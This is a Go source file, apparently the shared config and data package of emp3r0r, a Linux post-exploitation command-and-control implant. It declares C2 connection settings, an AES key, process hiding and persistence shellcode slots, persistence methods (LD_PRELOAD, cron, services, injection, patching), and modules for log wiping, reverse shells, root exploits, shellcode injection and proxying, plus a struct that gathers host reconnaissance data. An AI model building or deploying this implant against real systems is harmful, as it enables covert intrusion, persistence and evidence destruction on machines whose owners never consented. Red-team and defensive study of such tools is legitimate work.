package emp3r0r_data

import (
	"context"
	"net/http"
	"os"
	"strconv"

	"github.com/posener/h2conn"
	"github.com/txthinking/socks5"
)

var (
	// CCAddress how our agent finds its CC
	CCAddress = "https://[cc_ipaddr]"

	// CCIP IP address of CC
	CCIP = ""

	// Transport what transport is this agent using? (HTTP2 / CDN / TOR)
	Transport = "HTTP2"

	// AESKey generated from Tag -> md5sum, type: []byte
	AESKey = genAESKey("Your Pre Shared AES Key: " + OpSep)

	// HTTPClient handles agent's http communication
	HTTPClient *http.Client

	// H2Json the connection to CC, for JSON message-based communication
	H2Json *h2conn.Conn

	// ProxyServer Socks5 proxy listening on agent
	ProxyServer *socks5.Server

	// AgentProxy used by this agent to communicate with CC server
	AgentProxy = ""

	// DoHServer DNS over HTTPS server for global name resolving
	DoHServer = ""

	// CDNProxy websocket address of the C2 behind CDN
	CDNProxy = ""

	// SocketName name of our unix socket
	SocketName = AgentRoot + "/.socket"

	// HIDE_PIDS all the processes
	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}

	// GuardianShellcode inject into a process to gain persistence
	GuardianShellcode = `[persistence_shellcode]`

	// GuardianAgentPath where the agent binary is stored
	GuardianAgentPath = "[persistence_agent_path]"

	// Version record version on build time
	Version = "[version_string]"

	// AgentRoot root directory
	AgentRoot = "[agent_root]"

	// UtilsPath binary path of utilities
	UtilsPath = AgentRoot + "/bin"

	// DefaultShell the shell to use, use static bash binary when possible
	DefaultShell = UtilsPath + "/bash"

	// Libemp3r0rFile shard library of emp3r0r, for hiding and persistence
	Libemp3r0rFile = UtilsPath + "/libe.so"

	// PIDFile stores agent PID
	PIDFile = AgentRoot + "/.pid"

	// CCPort port of c2
	CCPort = "[cc_port]"

	// ProxyPort start a socks5 proxy to help other agents, on 0.0.0.0:port
	ProxyPort = "[proxy_port]"

	// SSHDPort port of sshd
	SSHDPort = "[sshd_port]"

	// ReverseProxyPort for reverse proxy
	ReverseProxyPort = ""

	// BroadcastPort port of broadcast server
	BroadcastPort = "[broadcast_port]"

	// BroadcastIntervalMin broadcast wait seconds
	BroadcastIntervalMin = 30

	// BroadcastIntervalMax broadcast wait seconds
	BroadcastIntervalMax = 120

	// CCIndicator check this before trying connection
	CCIndicator = "[cc_indicator]"

	// CCIndicatorText content of your indicator file
	CCIndicatorText = "[indicator_text]"

	// IndicatorWaitMin cc indicator wait seconds
	IndicatorWaitMin = 30

	// IndicatorWaitMax cc indicator wait seconds
	IndicatorWaitMax = 120

	// AgentUUID uuid of this agent
	AgentUUID = "[agent_uuid]"

	// AgenTag tag of this agent
	AgentTag = ""
)

const (
	// OpSep separator of CC payload
	OpSep = "cb433bd1-354c-4802-a4fa-ece518f3ded1"

	// RShellBufSize buffer size of reverse shell stream
	RShellBufSize = 128

	// ProxyBufSize buffer size of port fwd
	ProxyBufSize = 1024

	// Unknown
	Unknown = "Unknown"
)

// built-in module names
const (
	ModCMD_EXEC     = "cmd_exec"
	ModCLEAN_LOG    = "clean_log"
	ModLPE_SUGGEST  = "lpe_suggest"
	ModPERSISTENCE  = "get_persistence"
	ModPROXY        = "run_proxy"
	ModPORT_FWD     = "port_fwd"
	ModSHELL        = "interactive_shell"
	ModVACCINE      = "vaccine"
	ModINJECTOR     = "injector"
	ModGET_ROOT     = "get_root"
	ModREVERSEPROXY = "reverse_proxy"
	ModGDB          = "gdbserver"
	ModBettercap    = "bettercap"
)

// PersistMethods CC calls one of these methods to get persistence, or all of them at once
var PersistMethods = map[string]string{
	"ld_preload": "ldPreload",
	"profiles":   "profiles",
	"service":    "service",
	"injector":   "injector",
	"cron":       "cronJob",
	"patcher":    "patcher",
}

// Module help info, ls_modules shows this
var ModuleComments = map[string]string{
	ModCMD_EXEC:     "Run a single command on a target",
	ModCLEAN_LOG:    "Delete lines containing keyword from *tmp logs",
	ModLPE_SUGGEST:  "Run linux-smart-enumeration or linux exploit suggester",
	ModPERSISTENCE:  "Get persistence via built-in methods",
	ModPROXY:        "Start a socks proxy on target, and use it locally on C2 side",
	ModPORT_FWD:     "Port mapping from agent to CC (or vice versa), via HTTP2 (or other) tunnel",
	ModSHELL:        "Run custom bash on target, a perfect reverse shell",
	ModVACCINE:      "Vaccine helps you install additional tools on target system",
	ModINJECTOR:     "Inject shellcode/loader.so into a running process",
	ModGET_ROOT:     "Try some built-in LPE exploits",
	ModREVERSEPROXY: "Manually proxy agents who are unable to use our forward proxy",
	ModBettercap:    "Remote bettercap, offered as an interactive shell",
	ModGDB:          "Remote gdbserver, debug anything",
}

// Module help for options, does not include every module since not all modules need args
// help module shows this
var ModuleHelp = map[string]map[string]string{
	ModCMD_EXEC: {
		"cmd_to_exec": "Press TAB for some hints",
	},
	ModCLEAN_LOG: {
		"keyword": "Delete all log entries containing this keyword",
	},
	ModLPE_SUGGEST: {
		"lpe_helper": "'linux-smart-enumeration' or 'linux-exploit-suggester'?",
	},
	ModPROXY: {
		"port":   "Port of our local proxy server",
		"status": "Turn proxy on/off",
	},
	ModPORT_FWD: {
		"to":          "Address:Port (to forward to) on agent/CC side",
		"listen_port": "Listen port on CC/agent side",
		"switch":      "Turn port mapping on/off, or use `reverse` mapping",
	},
	ModSHELL: {
		"shell": "Shell program to run",
		"args":  "Command line args of the shell program",
		"port":  "The (sshd) port that our shell will be using",
	},
	ModINJECTOR: {
		"pid":    "Target process PID, set to 0 to start a new process (sleep)",
		"method": "Use `inject_shellcode` to inject any shellcode, use `*_loader` to inject loader.so",
	},
	ModREVERSEPROXY: {
		"addr": "Target host to proxy, we will connect to it and proxy it out",
	},
	ModBettercap: {
		"args": "Command line args for bettercap",
	},
}

// Config build.json config file
type Config struct {
	Version              string `json:"version"`                // agent version
	CCPort               string `json:"cc_port"`                // "cc_port": "5381",
	ProxyPort            string `json:"proxy_port"`             // "proxy_port": "56238",
	SSHDPort             string `json:"sshd_port"`              // "sshd_port": "2222",
	BroadcastPort        string `json:"broadcast_port"`         // "broadcast_port": "58485",
	BroadcastIntervalMin int    `json:"broadcast_interval_min"` // "broadcast_interval_min": 60, // seconds, set max to 0 to disable
	BroadcastIntervalMax int    `json:"broadcast_interval_max"` // "broadcast_interval_max": 120, // seconds, set max to 0 to disable
	CCIP                 string `json:"ccip"`                   // "ccip": "192.168.40.137",
	AgentRoot            string `json:"agent_root"`             // "agent_root": "/dev/shm/.848ba",
	PIDFile              string `json:"pid_file"`               // "pid_file": ".848ba.pid",
	CCIndicator          string `json:"cc_indicator"`           // "cc_indicator": "cc_indicator",
	IndicatorWaitMin     int    `json:"indicator_wait_min"`     // "indicator_wait_min": 60, // seconds
	IndicatorWaitMax     int    `json:"indicator_wait_max"`     // "indicator_wait_max": 120, // seconds, set max to 0 to disable
	CCIndicatorText      string `json:"indicator_text"`         // "indicator_text": "myawesometext"
	CA                   string `json:"ca"`                     // CA cert from server side
}

// SystemInfo agent properties
type SystemInfo struct {
	Tag         string        `json:"Tag"`         // identifier of the agent
	Version     string        `json:"Version"`     // agent version
	Transport   string        `json:"Transport"`   // transport the agent uses (HTTP2 / CDN / TOR)
	Hostname    string        `json:"Hostname"`    // Hostname and machine ID
	Hardware    string        `json:"Hardware"`    // machine details and hypervisor
	Container   string        `json:"Container"`   // container tech (if any)
	CPU         string        `json:"CPU"`         // CPU info
	GPU         string        `json:"GPU"`         // GPU info
	Mem         string        `json:"Mem"`         // memory size
	OS          string        `json:"OS"`          // OS name and version
	Kernel      string        `json:"Kernel"`      // kernel release
	Arch        string        `json:"Arch"`        // kernel architecture
	IP          string        `json:"IP"`          // public IP of the target
	IPs         []string      `json:"IPs"`         // IPs that are found on target's NICs
	ARP         []string      `json:"ARP"`         // ARP table
	User        string        `json:"User"`        // user account info
	HasRoot     bool          `json:"HasRoot"`     // is agent run as root?
	HasTor      bool          `json:"HasTor"`      // is agent from Tor?
	HasInternet bool          `json:"HasInternet"` // has internet access?
	Process     *AgentProcess `json:"Process"`     // agent's process
}

// AgentProcess process info of our agent
type AgentProcess struct {
	PID     int    `json:"PID"`     // pid
	PPID    int    `json:"PPID"`    // parent PID
	Cmdline string `json:"Cmdline"` // process name and command line args
	Parent  string `json:"Parent"`  // parent process name and cmd line args
}

// MsgTunData data to send in the tunnel
type MsgTunData struct {
	Payload string `json:"payload"` // payload
	Tag     string `json:"tag"`     // tag of the agent
	Time    string `json:"time"`    // timestamp
}

// H2Conn add context to h2conn.Conn
type H2Conn struct {
	Conn   *h2conn.Conn
	Ctx    context.Context
	Cancel context.CancelFunc
}
